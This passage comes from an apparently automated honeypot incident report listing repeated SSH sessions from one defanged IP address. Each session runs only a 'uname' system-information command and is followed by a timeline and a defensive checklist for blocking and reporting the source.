| `2026-07-28 05:13:29` | `cowrie.session.params` |
| `2026-07-28 05:13:29` | `cowrie.command.input` |
| `2026-07-28 05:13:30` | `cowrie.log.closed` |
| `2026-07-28 05:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1690d25130c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:20` | `cowrie.session.connect` |
| `2026-07-28 05:13:23` | `cowrie.client.version` |
| `2026-07-28 05:13:23` | `cowrie.client.kex` |
| `2026-07-28 05:13:29` | `cowrie.login.success` |
| `2026-07-28 05:13:34` | `cowrie.session.params` |
| `2026-07-28 05:13:34` | `cowrie.command.input` |
| `2026-07-28 05:13:36` | `cowrie.log.closed` |
| `2026-07-28 05:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5902c1665e9d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:27` | `cowrie.session.connect` |
| `2026-07-28 05:13:29` | `cowrie.client.version` |
| `2026-07-28 05:13:29` | `cowrie.client.kex` |
| `2026-07-28 05:13:36` | `cowrie.login.success` |
| `2026-07-28 05:13:39` | `cowrie.session.params` |
| `2026-07-28 05:13:39` | `cowrie.command.input` |
| `2026-07-28 05:13:40` | `cowrie.log.closed` |
| `2026-07-28 05:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd5264cb5abc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:33` | `cowrie.session.connect` |
| `2026-07-28 05:13:35` | `cowrie.client.version` |
| `2026-07-28 05:13:35` | `cowrie.client.kex` |
| `2026-07-28 05:13:39` | `cowrie.login.success` |
| `2026-07-28 05:13:42` | `cowrie.session.params` |
| `2026-07-28 05:13:42` | `cowrie.command.input` |
| `2026-07-28 05:13:43` | `cowrie.log.closed` |
| `2026-07-28 05:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69fd92ecee8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:39` | `cowrie.session.connect` |
| `2026-07-28 05:13:40` | `cowrie.client.version` |
| `2026-07-28 05:13:40` | `cowrie.client.kex` |
| `2026-07-28 05:13:44` | `cowrie.login.success` |
| `2026-07-28 05:13:46` | `cowrie.session.params` |
| `2026-07-28 05:13:46` | `cowrie.command.input` |
| `2026-07-28 05:13:47` | `cowrie.log.closed` |
| `2026-07-28 05:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9007bb5dce7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:46` | `cowrie.session.connect` |
| `2026-07-28 05:13:46` | `cowrie.client.version` |
| `2026-07-28 05:13:46` | `cowrie.client.kex` |
| `2026-07-28 05:13:50` | `cowrie.login.success` |
| `2026-07-28 05:13:52` | `cowrie.session.params` |
| `2026-07-28 05:13:52` | `cowrie.command.input` |
| `2026-07-28 05:13:52` | `cowrie.log.closed` |
| `2026-07-28 05:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea048f4d5c3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:53` | `cowrie.session.connect` |
| `2026-07-28 05:13:53` | `cowrie.client.version` |
| `2026-07-28 05:13:53` | `cowrie.client.kex` |
| `2026-07-28 05:13:56` | `cowrie.login.success` |
| `2026-07-28 05:13:57` | `cowrie.session.params` |
| `2026-07-28 05:13:57` | `cowrie.command.input` |
| `2026-07-28 05:13:58` | `cowrie.log.closed` |
| `2026-07-28 05:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33f81049270

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:13 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:13:59` | `cowrie.session.connect` |
| `2026-07-28 05:13:59` | `cowrie.client.version` |
| `2026-07-28 05:13:59` | `cowrie.client.kex` |
| `2026-07-28 05:14:00` | `cowrie.login.success` |
| `2026-07-28 05:14:00` | `cowrie.session.params` |
| `2026-07-28 05:14:00` | `cowrie.command.input` |
| `2026-07-28 05:14:00` | `cowrie.log.closed` |
| `2026-07-28 05:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7fbb94cf106

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:05` | `cowrie.session.connect` |
| `2026-07-28 05:14:06` | `cowrie.client.version` |
| `2026-07-28 05:14:06` | `cowrie.client.kex` |
| `2026-07-28 05:14:07` | `cowrie.login.success` |
| `2026-07-28 05:14:08` | `cowrie.session.params` |
| `2026-07-28 05:14:08` | `cowrie.command.input` |
| `2026-07-28 05:14:08` | `cowrie.log.closed` |
| `2026-07-28 05:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0bd558fbfc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:12` | `cowrie.session.connect` |
| `2026-07-28 05:14:12` | `cowrie.client.version` |
| `2026-07-28 05:14:12` | `cowrie.client.kex` |
| `2026-07-28 05:14:12` | `cowrie.login.success` |
| `2026-07-28 05:14:13` | `cowrie.session.params` |
| `2026-07-28 05:14:13` | `cowrie.command.input` |
| `2026-07-28 05:14:14` | `cowrie.log.closed` |
| `2026-07-28 05:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5446e0baa7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:18` | `cowrie.session.connect` |
| `2026-07-28 05:14:18` | `cowrie.client.version` |
| `2026-07-28 05:14:18` | `cowrie.client.kex` |
| `2026-07-28 05:14:19` | `cowrie.login.success` |
| `2026-07-28 05:14:20` | `cowrie.session.params` |
| `2026-07-28 05:14:20` | `cowrie.command.input` |
| `2026-07-28 05:14:20` | `cowrie.log.closed` |
| `2026-07-28 05:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2f3b734b8b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:26` | `cowrie.session.connect` |
| `2026-07-28 05:14:26` | `cowrie.client.version` |
| `2026-07-28 05:14:26` | `cowrie.client.kex` |
| `2026-07-28 05:14:27` | `cowrie.login.success` |
| `2026-07-28 05:14:27` | `cowrie.session.params` |
| `2026-07-28 05:14:27` | `cowrie.command.input` |
| `2026-07-28 05:14:28` | `cowrie.log.closed` |
| `2026-07-28 05:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26429cb2820d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:32` | `cowrie.session.connect` |
| `2026-07-28 05:14:32` | `cowrie.client.version` |
| `2026-07-28 05:14:32` | `cowrie.client.kex` |
| `2026-07-28 05:14:33` | `cowrie.login.success` |
| `2026-07-28 05:14:34` | `cowrie.session.params` |
| `2026-07-28 05:14:34` | `cowrie.command.input` |
| `2026-07-28 05:14:34` | `cowrie.log.closed` |
| `2026-07-28 05:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3792729e9451

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:38` | `cowrie.session.connect` |
| `2026-07-28 05:14:39` | `cowrie.client.version` |
| `2026-07-28 05:14:39` | `cowrie.client.kex` |
| `2026-07-28 05:14:39` | `cowrie.login.success` |
| `2026-07-28 05:14:40` | `cowrie.session.params` |
| `2026-07-28 05:14:40` | `cowrie.command.input` |
| `2026-07-28 05:14:40` | `cowrie.log.closed` |
| `2026-07-28 05:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34146aa342b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:45` | `cowrie.session.connect` |
| `2026-07-28 05:14:45` | `cowrie.client.version` |
| `2026-07-28 05:14:45` | `cowrie.client.kex` |
| `2026-07-28 05:14:45` | `cowrie.login.success` |
| `2026-07-28 05:14:46` | `cowrie.session.params` |
| `2026-07-28 05:14:46` | `cowrie.command.input` |
| `2026-07-28 05:14:47` | `cowrie.log.closed` |
| `2026-07-28 05:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7f3d5ba12f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:50` | `cowrie.session.connect` |
| `2026-07-28 05:14:50` | `cowrie.client.version` |
| `2026-07-28 05:14:50` | `cowrie.client.kex` |
| `2026-07-28 05:14:52` | `cowrie.login.success` |
| `2026-07-28 05:14:54` | `cowrie.session.params` |
| `2026-07-28 05:14:54` | `cowrie.command.input` |
| `2026-07-28 05:14:54` | `cowrie.log.closed` |
| `2026-07-28 05:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01297ab60d60

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:14 |
| **Last Seen** | 2026-07-28 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:14:56` | `cowrie.session.connect` |
| `2026-07-28 05:14:56` | `cowrie.client.version` |
| `2026-07-28 05:14:56` | `cowrie.client.kex` |
| `2026-07-28 05:14:57` | `cowrie.login.success` |
| `2026-07-28 05:14:57` | `cowrie.session.params` |
| `2026-07-28 05:14:57` | `cowrie.command.input` |
| `2026-07-28 05:14:58` | `cowrie.log.closed` |
| `2026-07-28 05:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8290b1abd7d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:02` | `cowrie.session.connect` |
| `2026-07-28 05:15:02` | `cowrie.client.version` |
| `2026-07-28 05:15:02` | `cowrie.client.kex` |
| `2026-07-28 05:15:03` | `cowrie.login.success` |
| `2026-07-28 05:15:04` | `cowrie.session.params` |
| `2026-07-28 05:15:04` | `cowrie.command.input` |
| `2026-07-28 05:15:04` | `cowrie.log.closed` |
| `2026-07-28 05:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f75a40b505f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:09` | `cowrie.session.connect` |
| `2026-07-28 05:15:09` | `cowrie.client.version` |
| `2026-07-28 05:15:09` | `cowrie.client.kex` |
| `2026-07-28 05:15:10` | `cowrie.login.success` |
| `2026-07-28 05:15:11` | `cowrie.session.params` |
| `2026-07-28 05:15:11` | `cowrie.command.input` |
| `2026-07-28 05:15:11` | `cowrie.log.closed` |
| `2026-07-28 05:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8002f84fea64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:15` | `cowrie.session.connect` |
| `2026-07-28 05:15:15` | `cowrie.client.version` |
| `2026-07-28 05:15:15` | `cowrie.client.kex` |
| `2026-07-28 05:15:15` | `cowrie.login.success` |
| `2026-07-28 05:15:16` | `cowrie.session.params` |
| `2026-07-28 05:15:16` | `cowrie.command.input` |
| `2026-07-28 05:15:16` | `cowrie.log.closed` |
| `2026-07-28 05:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945b8a411163

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:19` | `cowrie.session.connect` |
| `2026-07-28 05:15:20` | `cowrie.client.version` |
| `2026-07-28 05:15:20` | `cowrie.client.kex` |
| `2026-07-28 05:15:21` | `cowrie.login.success` |
| `2026-07-28 05:15:23` | `cowrie.session.params` |
| `2026-07-28 05:15:23` | `cowrie.command.input` |
| `2026-07-28 05:15:24` | `cowrie.log.closed` |
| `2026-07-28 05:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ada80f4ca2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:25` | `cowrie.session.connect` |
| `2026-07-28 05:15:25` | `cowrie.client.version` |
| `2026-07-28 05:15:25` | `cowrie.client.kex` |
| `2026-07-28 05:15:28` | `cowrie.login.success` |
| `2026-07-28 05:15:30` | `cowrie.session.params` |
| `2026-07-28 05:15:30` | `cowrie.command.input` |
| `2026-07-28 05:15:30` | `cowrie.log.closed` |
| `2026-07-28 05:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dcc49c5cb24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:30` | `cowrie.session.connect` |
| `2026-07-28 05:15:31` | `cowrie.client.version` |
| `2026-07-28 05:15:31` | `cowrie.client.kex` |
| `2026-07-28 05:15:34` | `cowrie.login.success` |
| `2026-07-28 05:15:37` | `cowrie.session.params` |
| `2026-07-28 05:15:37` | `cowrie.command.input` |
| `2026-07-28 05:15:38` | `cowrie.log.closed` |
| `2026-07-28 05:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f106c5152ba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:35` | `cowrie.session.connect` |
| `2026-07-28 05:15:37` | `cowrie.client.version` |
| `2026-07-28 05:15:37` | `cowrie.client.kex` |
| `2026-07-28 05:15:40` | `cowrie.login.success` |
| `2026-07-28 05:15:42` | `cowrie.session.params` |
| `2026-07-28 05:15:42` | `cowrie.command.input` |
| `2026-07-28 05:15:43` | `cowrie.log.closed` |
| `2026-07-28 05:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0952d937f658

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:42` | `cowrie.session.connect` |
| `2026-07-28 05:15:42` | `cowrie.client.version` |
| `2026-07-28 05:15:42` | `cowrie.client.kex` |
| `2026-07-28 05:15:45` | `cowrie.login.success` |
| `2026-07-28 05:15:47` | `cowrie.session.params` |
| `2026-07-28 05:15:47` | `cowrie.command.input` |
| `2026-07-28 05:15:48` | `cowrie.log.closed` |
| `2026-07-28 05:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8349451084

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:15:47` | `cowrie.session.connect` |
| `2026-07-28 05:15:48` | `cowrie.client.version` |
| `2026-07-28 05:15:48` | `cowrie.client.kex` |
| `2026-07-28 05:15:51` | `cowrie.login.success` |
| `2026-07-28 05:15:52` | `cowrie.session.params` |
| `2026-07-28 05:15:52` | `cowrie.command.input` |
| `2026-07-28 05:15:53` | `cowrie.log.closed` |
| `2026-07-28 05:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92cac2870ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:15 |
| **Last Seen** | 2026-07-28 05:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
